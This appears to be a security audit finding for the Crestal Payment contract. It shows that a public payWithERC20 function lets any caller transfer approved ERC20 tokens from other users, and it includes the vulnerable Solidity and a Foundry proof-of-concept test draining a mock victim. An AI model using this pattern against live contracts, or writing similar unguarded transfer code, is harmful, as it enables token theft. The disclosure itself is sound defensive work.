## Unrestricted Access to payWithERC20 Allows Arbitrary Token Transfers and Accounting Discrepancies
## Summary
The payWithERC20 function is publicly accessible and lacks proper authorization checks, enabling malicious actors to transfer tokens from any address that has granted approval to the contract. This bypasses admin-controlled token allowlists and creates inconsistencies between actual token balances and internal accounting userTopUpMp in the BlueprintCore contract.

## Root Cause
https://github.com/sherlock-audit/2025-03-crestal-network/blob/main/crestal-omni-contracts/src/Payment.sol#L25
```javascript
// This is to support gasless flow: normally, the caller must always be the msg.sender
    // slither-disable-next-line arbitrary-send-erc20
    function payWithERC20(address erc20TokenAddress, uint256 amount, address fromAddress, address toAddress) public {
        // check from and to address
        require(fromAddress != toAddress, "Cannot transfer to self address");
        require(toAddress != address(0), "Invalid to address");
        require(amount > 0, "Amount must be greater than 0");
        IERC20 token = IERC20(erc20TokenAddress);
        token.safeTransferFrom(fromAddress, toAddress, amount);
    }
```
the payWithERC20 function is declared public and does not:

Restrict direct external calls.
Validate if the token (erc20TokenAddress) is admin-approved via paymentAddressEnableMp.
Ensure the caller (msg.sender) is authorized to act on behalf of fromAddress.

## Internal Pre-conditions
- The payWithERC20 function is callable by any external address.

- The paymentAddressEnableMp check is only enforced in userTopUp, not in payWithERC20.

- Accounting updates userTopUpMp are decoupled from token transfers.

## External Pre-conditions
- A user has approved the contract to spend their ERC20 tokens

- An attacker identifies the contract’s address and its public payWithERC20 function.

## Attack Path
The exploit scenarion can occur in two ways:

- Enabled Token (USDT): Bob directly calls payWithERC20 to transfer Alice's USDT to the fee wallet. The transfer succeeds despite Alice never initiating a top-up, and her accounting isn't updated.

- Non-Enabled Token (USDC): Bob transfers USDC (not in allowlist) using the same method. The transfer succeeds, demonstrating the missing token validation in payWithERC20.

## Impact
Theft of Tokens: Attackers can drain tokens from any address that has approved the contract.
Accounting Mismatch: Token transfers via payWithERC20 do not update userTopUpMp, leading to incorrect user balances.
PoC
```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test} from "forge-std/Test.sol";
import {BlueprintCore} from "../src/BlueprintCore.sol";
import {Payment} from "../src/Payment.sol";
import {MockERC20} from "../test/MockERC20.sol";

contract ErrorTest is Test {
    BlueprintCore blue;
    Payment payment;
    MockERC20 public usdc;
    MockERC20 public usdt;

    address public Alice = makeAddr("Alice");
    address public Bob = makeAddr("Bob");
    address public Admin = makeAddr("Admin");
    address public feeWallet = makeAddr("feeWallet");

    function setUp() public {
        vm.startPrank(Admin);
        blue = new BlueprintCore();
        usdc = new MockERC20();
        usdt = new MockERC20();
        payment = new Payment();

         // Set fee wallet via storage hack (for demonstration)
        bytes32 slot = keccak256(abi.encode(uint256(2))); // Adjust slot based on actual layout
        vm.store(address(blue), slot, bytes32(uint256(uint160(feeWallet))));
        
        // Enable USDT as payment method
        blue.paymentAddressEnableMp(address(usdt));
        vm.stopPrank();

        // Fund Alice and approve the blueprint contract
        usdt.mint(Alice, 100e8);
        usdc.mint(Alice, 100e8);
        vm.prank(Alice);
        usdt.approve(address(blue), type(uint256).max);
        usdc.approve(address(blue), type(uint256).max);
    } 

    function test_ExploitWithEnabledToken() public {
        uint256 initialAliceBalance = usdt.balanceOf(Alice);
        uint256 initialFeeWalletBalance = usdt.balanceOf(feeWallet);

        vm.prank(Alice);
        usdt.approve(address(payment), 50e8);

        //Bob exploit the payWithERC20
        vm.prank(Bob);
        payment.payWithERC20(address(usdt), 50e8, Alice, feeWallet);

        // verify Token wallet
        assertEq(usdt.balanceOf(Alice), initialAliceBalance - 50e8);
        assertEq(usdt.balanceOf(feeWallet), initialFeeWalletBalance + 50e8);

        // Verify accounting mismatch
        assertEq(blue.userTopUpMp(Alice, address(usdt)), 0);
    }

    function test_ExploitWithNonEnanbledToken() public {
        uint256 initialAliceBalance = usdc.balanceOf(Alice);
        uint256 initialFeeWalletBalance = usdc.balanceOf(feeWallet);

         vm.prank(Bob);
        payment.payWithERC20(address(usdc), 30e8, Alice, feeWallet);

        // Verify token transfers
        assertEq(usdc.balanceOf(Alice), initialAliceBalance - 30e8);
        assertEq(usdc.balanceOf(feeWallet), initialFeeWalletBalance + 30e8);

        // Verify no accounting update
        assertEq(blue.userTopUpMp(Alice, address(usdc)), 0);
    }
}
```